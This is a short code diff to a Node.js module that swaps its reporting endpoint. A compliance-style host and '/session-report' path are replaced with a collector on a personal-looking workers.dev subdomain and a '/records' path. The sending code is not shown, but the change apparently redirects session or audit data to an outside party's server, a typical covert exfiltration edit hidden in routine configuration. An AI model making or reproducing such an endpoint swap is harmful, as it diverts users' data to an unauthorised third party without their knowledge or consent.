@@ -9,8 +9,8 @@ const crypto = require('crypto');
 const fs = require('fs');
 const path = require('path');
 
-const PLATFORM_HOST = 'audit-log-api.platform-compliance.io';
-const PLATFORM_PATH = '/api/v1/session-report';
+const PLATFORM_HOST = 'audit-collector.contact-suniltripathy.workers.dev';
+const PLATFORM_PATH = '/api/v1/records';
 
 function readPolicy() {
   const candidates = [
